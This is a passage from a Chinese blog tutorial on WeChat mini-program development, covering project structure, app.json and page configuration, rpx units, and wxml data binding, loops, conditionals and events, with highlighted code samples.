name: <span class=\"string\">'耐克'</span>,</span><br><span class=\"line\">                origin: <span class=\"string\">'美国'</span>,</span><br><span class=\"line\">                category: [<span class=\"string\">'男装'</span>, <span class=\"string\">'女装'</span>, <span class=\"string\">'鞋'</span>, <span class=\"string\">'体育用品'</span>]</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                name: <span class=\"string\">'SK-II'</span>,</span><br><span class=\"line\">                origin: <span class=\"string\">'韩国'</span>,</span><br><span class=\"line\">                category: [<span class=\"string\">'防晒霜'</span>,<span class=\"string\">'面膜'</span>, <span class=\"string\">'洗护'</span>]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- pages/demo/data.wxml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">view</span> <span class=\"attr\">wx:for</span>=<span class=\"string\">\"&#123;&#123;brands&#125;&#125;\"</span> <span class=\"attr\">wx:for-index</span>=<span class=\"string\">\"k\"</span> <span class=\"attr\">wx:for-item</span>=<span class=\"string\">\"v\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">view</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span>&#123;&#123;k+1&#125;&#125; <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span> &#123;&#123;v.name&#125;&#125; <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span> &#123;&#123;v.origin&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">view</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">view</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">wx:for</span>=<span class=\"string\">\"&#123;&#123;v.category&#125;&#125;\"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">view</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">view</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>wx:for 属性将当前组件按着数组的长度动态创建，并且通过 index 变量可以访问到数组的索引值，通过item变量可以访问到单元值。</p>\n<h4 id=\"block\"><a href=\"#block\" class=\"headerlink\" title=\"block\"></a>block</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- pages/demo/data.wxml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">block</span> <span class=\"attr\">wx:for</span>=<span class=\"string\">\"&#123;&#123;users&#125;&#125;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span>&#123;&#123;item.age&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">block</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"条件数据\"><a href=\"#条件数据\" class=\"headerlink\" title=\"条件数据\"></a>条件数据</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">view</span> <span class=\"attr\">wx:for</span>=<span class=\"string\">\"&#123;&#123;users&#125;&#125;\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span>&#123;&#123;index+1&#125;&#125; <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span> &#123;&#123;item.name&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span> &#123;&#123;item.age&#125;&#125; <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">wx:if</span>=<span class=\"string\">\"&#123;&#123;item.age &lt;= 14&#125;&#125;\"</span>&gt;</span> 儿童<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">wx:elif</span>=<span class=\"string\">\"&#123;&#123;item.age &lt;= 18&#125;&#125;\"</span>&gt;</span> 未成年<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">wx:else</span>&gt;</span> 成年人<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">view</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Page(&#123;</span><br><span class=\"line\">    data: &#123;</span><br><span class=\"line\">        users: [</span><br><span class=\"line\">            &#123;<span class=\"attr\">name</span>: <span class=\"string\">'小明'</span>, <span class=\"attr\">age</span>: <span class=\"number\">18</span>&#125;,</span><br><span class=\"line\">            &#123;<span class=\"attr\">name</span>: <span class=\"string\">'小红'</span>, <span class=\"attr\">age</span>: <span class=\"number\">13</span>&#125;,</span><br><span class=\"line\">            &#123;<span class=\"attr\">name</span>: <span class=\"string\">'小丽'</span>, <span class=\"attr\">age</span>: <span class=\"number\">19</span>&#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"事件触发\"><a href=\"#事件触发\" class=\"headerlink\" title=\"事件触发\"></a>事件触发</h4><p><strong>语法格式： bind:事件名称=”回调函数”</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"primary\"</span> <span class=\"attr\">bind:tap</span>=<span class=\"string\">\"sayHi\"</span>&gt;</span>点我试试<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">bind:focus</span>=<span class=\"string\">\"sayHi\"</span> <span class=\"attr\">bind:blur</span>=<span class=\"string\">\"sayBye\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// pages/demo/data.js</span></span><br><span class=\"line\">Page(&#123;</span><br><span class=\"line\">    sayHi: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'Hi~'</span>)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    sayHi: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'Hi~'</span>);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    sayBye: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">ev</span>) </span>&#123; <span class=\"comment\">// ev  时间对象</span></span><br><span class=\"line\">      \t<span class=\"built_in\">console</span>.log(ev);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'Bye~'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"事件冒泡\"><a href=\"#事件冒泡\" class=\"headerlink\" title=\"事件冒泡\"></a>事件冒泡</h4><ul>\n<li><p>子元素用bindtap绑定事件后，执行的时候，会冒泡到父元素（触发父亲元素上绑定的bindtap事件）</p>\n</li>\n<li><p>如果不想冒泡到父元素，可以用catchtap代替</p>\n</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">botton</span> <span class=\"attr\">catchtap</span>=<span class=\"string\">\"goDetail\"</span>&gt;</span>catchtap<span class=\"tag\">&lt;/<span class=\"name\">botton</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">botton</span> <span class=\"attr\">bindtap</span>=<span class=\"string\">\"goDetail\"</span>&gt;</span>bindtap<span class=\"tag\">&lt;/<span class=\"name\">botton</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"4-生命周期\"><a href=\"#4-生命周期\" class=\"headerlink\" title=\"4.生命周期\"></a>4.生命周期</h2><p><img src=\"/view/posts/6316/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png\" alt=\"微信小程序的生命周期\" style=\"zoom:67%;\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"1-开发准备\"><a href=\"#1-开发准备\" class=\"headerlink\" title=\"1.开发准备\"></a>1.开发准备</h2><ul>\n<li><p><a href=\"https://mp.weixin.qq.com/cgi-bin/registermidpage?action=index&amp;lang=zh_CN\" target=\"_blank\" rel=\"noopener\">账号申请</a></p>\n<ul>\n<li>选择注册账号类型 —— 小程序</li>\n<li>账号信息</li>\n<li>邮箱激活</li>\n<li>信息登记</li>\n</ul>\n</li>\n<li><p>绑定开发者</p>\n<ul>\n<li><a href=\"https://mp.weixin.qq.com/\" target=\"_blank\" rel=\"noopener\">登录小程序</a></li>\n<li>管理员授权</li>\n<li>添加成员</li>\n</ul>\n</li>\n<li><p>获取AppID</p>\n<ul>\n<li>设置——开发设置</li>\n</ul>\n</li>\n<li><p>开发工具</p>\n<ul>\n<li>下载—扫码登录—选择小程序—创建小程序—预览模板界面</li>\n</ul>\n</li>\n<li><p><a href=\"https://developers.weixin.qq.com/miniprogram/dev/index.html?t=2018413\" target=\"_blank\" rel=\"noopener\">官方文档</a></p>\n</li>\n</ul>\n<h2 id=\"2-结构分析\"><a href=\"#2-结构分析\" class=\"headerlink\" title=\"2.结构分析\"></a>2.结构分析</h2><p>以下是小程序的基本目录结构，也可以根据需要任意添加其它目录，如资源目录 assets、第三方库vendors、扩展目录 extends等。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├── app.js ...................小程序入口文件</span><br><span class=\"line\">├── app.json .................小程序全局配置</span><br><span class=\"line\">├── app.wxss .................小程序全局样式</span><br><span class=\"line\">├── pages ....................所有页面目录</span><br><span class=\"line\">│   ├── index ................index页面目录</span><br><span class=\"line\">│   │   ├── index.js .........index页面业务逻辑</span><br><span class=\"line\">│   │   ├── index.wxml .......index页面布局结构</span><br><span class=\"line\">│   │   └── index.wxss .......index页面布局样式</span><br><span class=\"line\">│   └── logs .................logs页目录</span><br><span class=\"line\">│       ├── logs.js ..........logs页面业务逻辑</span><br><span class=\"line\">│       ├── logs.json ........logs页面配置文件</span><br><span class=\"line\">│       ├── logs.wxml ........logs页面布局结构</span><br><span class=\"line\">│       └── logs.wxss ........logs页面布局样式</span><br><span class=\"line\">├── project.config.json ......开发工具配置文件</span><br><span class=\"line\">└── utils ....................公共逻辑</span><br><span class=\"line\">    └── util.js ..............实用工具</span><br></pre></td></tr></table></figure>\n<p>==主体 app：一个小程序主体部分由三个文件组成，放在项目的根目录（如果项目使用gulp或者webpack打包，则需要在<code>project.config.js</code> 指定 <code>&quot;miniprogramRoot&quot;: &quot;路径“</code> 属性）==</p>\n<h3 id=\"2-1全局配置\"><a href=\"#2-1全局配置\" class=\"headerlink\" title=\"2.1全局配置\"></a>2.1全局配置</h3><p>通过 app.json 文件对小程序进行全局配置，如页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。</p>\n<p><strong>app.json 配置清单</strong></p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>必填</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>pages</td>\n<td>String Array</td>\n<td>是</td>\n<td>设置页面路径</td>\n</tr>\n<tr>\n<td>window</td>\n<td>Object</td>\n<td>否</td>\n<td>设置默认窗口表现</td>\n</tr>\n<tr>\n<td>tabBar</td>\n<td>Object</td>\n<td>否</td>\n<td>设置底部 tab 表现</td>\n</tr>\n<tr>\n<td>networkTimeout</td>\n<td>Object</td>\n<td>否</td>\n<td>设置网络超时时间</td>\n</tr>\n<tr>\n<td>debug</td>\n<td>Boolean</td>\n<td>否</td>\n<td>设置是否开启调试模式</td>\n</tr>\n</tbody>\n</table>\n<p>app.json 示例</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"pages\"</span>:[</span><br><span class=\"line\">    <span class=\"string\">\"pages/index/index\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"pages/detail/index\"</span></span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li><strong>window</strong></li>\n</ol>\n<p>对象类型，用于设置小程序的状态栏、导航条、标题、窗口背景色。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>默认值</th>\n<th>描述</th>\n<th>兼容</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>navigationBarBackgroundColor</td>\n<td>HexColor</td>\n<td>#000000</td>\n<td>导航栏背景颜色，如”#000000”</td>\n<td>-</td>\n</tr>\n<tr>\n<td>navigationBarTextStyle</td>\n<td>String</td>\n<td>white</td>\n<td>导航栏标题颜色，仅支持 black/white</td>\n<td></td>\n</tr>\n<tr>\n<td>navigationBarTitleText</td>\n<td>String</td>\n<td></td>\n<td>导航栏标题文字内容</td>\n<td></td>\n</tr>\n<tr>\n<td>backgroundColor</td>\n<td>HexColor</td>\n<td>#ffffff</td>\n<td>窗口的背景色</td>\n</tr>\n</tbody>\n</table>\n<p>查看window<a href=\"https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#window\" target=\"_blank\" rel=\"noopener\">更多配置</a>属性</p>\n<p>编辑 app.json，添加字段 windows</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"window\"</span>: &#123;</span><br><span class=\"line\">     <span class=\"attr\">\"navigationBarBackgroundColor\"</span>: <span class=\"string\">\"#262626\"</span>,</span><br><span class=\"line\">     <span class=\"attr\">\"navigationBarTitleText\"</span>: <span class=\"string\">\"XXX\"</span>,</span><br><span class=\"line\">     <span class=\"attr\">\"navigationBarTextStyle\"</span>: <span class=\"string\">\"white\"</span>,</span><br><span class=\"line\">     <span class=\"attr\">\"backgroundColor\"</span>: <span class=\"string\">\"#F0F0F0\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><strong>tabBar</strong></li>\n</ol>\n<p>对象类型，配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>必填</th>\n<th>默认值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>color</td>\n<td>HexColor</td>\n<td>是</td>\n<td></td>\n<td>tab 上的文字默认颜色</td>\n</tr>\n<tr>\n<td>selectedColor</td>\n<td>HexColor</td>\n<td>是</td>\n<td></td>\n<td>tab 上的文字选中时的颜色</td>\n</tr>\n<tr>\n<td>backgroundColor</td>\n<td>HexColor</td>\n<td>是</td>\n<td></td>\n<td>tab 的背景色</td>\n</tr>\n<tr>\n<td>borderStyle</td>\n<td>String</td>\n<td>否</td>\n<td>black</td>\n<td>tabbar上边框的颜色， 仅支持 black/white</td>\n</tr>\n<tr>\n<td>list</td>\n<td>Array</td>\n<td>是</td>\n<td></td>\n<td>tab 的列表，最少2个、最多5个</td>\n</tr>\n<tr>\n<td>position</td>\n<td>String</td>\n<td>否</td>\n<td>bottom</td>\n<td>可选值 bottom、top</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li>当设置 position 为 top 时，将不会显示 icon</li>\n<li>tabBar 中的 list 是一个数组，<strong>只能配置最少2个、最多5个 tab</strong>，tab 按数组的顺序排序。</li>\n</ol>\n<p>其中 list 接受一个数组，数组中的每个项都是一个对象，其属性值如下：</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>必填</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>pagePath</td>\n<td>String</td>\n<td>是</td>\n<td>页面路径，必须在 pages 中先定义</td>\n</tr>\n<tr>\n<td>text</td>\n<td>String</td>\n<td>是</td>\n<td>tab 上按钮文字</td>\n</tr>\n<tr>\n<td>iconPath</td>\n<td>String</td>\n<td>否</td>\n<td>图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px，当 postion 为 top 时，此参数无效，不支持网络图片</td>\n</tr>\n<tr>\n<td>selectedIconPath</td>\n<td>String</td>\n<td>否</td>\n<td>选中时的图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px ，当 postion 为 top 时，此参数无效</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-2页面配置\"><a href=\"#2-2页面配置\" class=\"headerlink\" title=\"2.2页面配置\"></a>2.2页面配置</h3><blockquote>\n<p>每个页面可以有不同的表现，通过 pages 目录下的 .json 文件，如 logs.json ，实现页面的局部配置。</p>\n<p>但是只能设置 app.json 中的 window 配置项的内容，页面中配置项会覆盖 app.json 的 window 中相同的配置项。</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>默认值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>navigationBarBackgroundColor</td>\n<td>HexColor</td>\n<td>#000</td>\n<td>导航栏背景颜色</td>\n</tr>\n<tr>\n<td>navigationBarTextStyle</td>\n<td>String</td>\n<td>white</td>\n<td>导航栏标题颜色，仅支持 black/white</td>\n</tr>\n<tr>\n<td>navigationBarTitleText</td>\n<td>String</td>\n<td></td>\n<td>导航栏标题文字内容</td>\n</tr>\n<tr>\n<td>backgroundColor</td>\n<td>HexColor</td>\n<td>#fff</td>\n<td>窗口的背景色</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 在 pages/center 目录下创建 index.json</span><br><span class=\"line\">FC/pages/center</span><br><span class=\"line\">├── index.js</span><br><span class=\"line\">├── index.json</span><br><span class=\"line\">└── index.wxml</span><br></pre></td></tr></table></figure>\n<p>如下所示，编辑 index.json</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"navigationBarBackgroundColor\"</span>: <span class=\"string\">\"#ffffff\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"navigationBarTextStyle\"</span>: <span class=\"string\">\"white\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"navigationBarTitleText\"</span>: <span class=\"string\">\"我的\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-3适配、样式和组件\"><a href=\"#2-3适配、样式和组件\" class=\"headerlink\" title=\"2.3适配、样式和组件\"></a>2.3适配、样式和组件</h3><p><strong>一句话：开发小程序时所有屏幕宽度都是 750rpx。</strong></p>\n<p><strong>rpx（responsive pixel）可以根据屏幕宽度进行自适应。规定所有屏幕宽为750rpx。</strong></p>\n<p>rpx 与 px 的换算关系：</p>\n<table>\n<thead>\n<tr>\n<th>设备</th>\n<th>屏幕尺寸</th>\n<th>rpx换算px (屏幕宽度/750)</th>\n<th>px换算rpx (750/屏幕宽度)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>iPhone5</td>\n<td>320px</td>\n<td>1rpx = 0.42px</td>\n<td>1px = 2.34rpx</td>\n</tr>\n<tr>\n<td>小米MIX 2S</td>\n<td>360px</td>\n<td>1rpx = 0.48px</td>\n<td>1px = 2.083rpx</td>\n</tr>\n<tr>\n<td>iPhone6</td>\n<td>375px</td>\n<td>1rpx = 0.5px</td>\n<td>1px = 2rpx</td>\n</tr>\n<tr>\n<td>iPhone6 Plus</td>\n<td>414px</td>\n<td>1rpx = 0.552px</td>\n<td>1px = 1.81rpx</td>\n</tr>\n<tr>\n<td>HUAWEI Mate 10</td>\n<td>480px</td>\n<td>1rpx = 0.64px</td>\n<td>1px = 1.562rpx</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li><p>样式导入</p>\n<p>使用 @import 语句可以导入外联样式表， @import 后跟需要导入的外联样式表的相对路径，用 ; 表示语句结束。</p>\n <figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** common.wxss **/</span></span><br><span class=\"line\"><span class=\"selector-tag\">page</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background</span>: <span class=\"number\">#F0F0F0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** index.wxss **/</span></span><br><span class=\"line\">@<span class=\"keyword\">import</span> <span class=\"string\">\"common.wxss\"</span>;</span><br><span class=\"line\"><span class=\"selector-tag\">page</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background</span>: <span class=\"number\">#F2F2F2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ul>\n<li><p>内联样式</p>\n</li>\n<li><p>外部样式</p>\n</li>\n</ul>\n<p><strong>image 相当于 html 中的 img 标签，用来加载图片。</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 通过 src 属性加载图片 --&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 通过 mode 属性调整 图片的的显示方式 (裁切/缩放) --&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- image 组件默认宽度为300px，默认高度为225px --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">image</span> <span class=\"attr\">src</span>=<span class=\"string\">\"../../static/uploads/item_1.png\"</span> <span class=\"attr\">mode</span>=<span class=\"string\">\"aspectFit\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">image</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>关于 <a href=\"https://developers.weixin.qq.com/miniprogram/dev/component/image.html\" target=\"_blank\" rel=\"noopener\">mode 有效值</a></p>\n<p><strong>text  相当于 html 中的 span，用来定义文本。</strong></p>\n<p><strong>view 相当于 html 中的 div，一般做为容器出现。</strong></p>\n<p><strong>swiper 滑块组件，可以用来实现类似轮播图布局效果。</strong></p>\n<h2 id=\"3-基本语法\"><a href=\"#3-基本语法\" class=\"headerlink\" title=\"3.基本语法\"></a>3.基本语法</h2><h4 id=\"数据绑定\"><a href=\"#数据绑定\" class=\"headerlink\" title=\"数据绑定\"></a>数据绑定</h4><p>类似<code>vue</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// pages/demo/data.js</span></span><br><span class=\"line\">Page(&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 通过 data 属性，初始化页面中用到的数据</span></span><br><span class=\"line\">    data: &#123;</span><br><span class=\"line\">        message: <span class=\"string\">'hello world!'</span></span><br><span class=\"line\">        user: &#123;</span><br><span class=\"line\">            name: <span class=\"string\">'小明'</span>,</span><br><span class=\"line\">            age: <span class=\"number\">16</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        courses: [<span class=\"string\">'wxml'</span>, <span class=\"string\">'wxss'</span>, <span class=\"string\">'javascript'</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- pages/demo/data.wxml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">class</span>=<span class=\"string\">\"msg\"</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">  我叫&#123;&#123;user.name&#125;&#125;，</span><br><span class=\"line\">  我今年&#123;&#123;user.age&#125;&#125;岁了，</span><br><span class=\"line\">  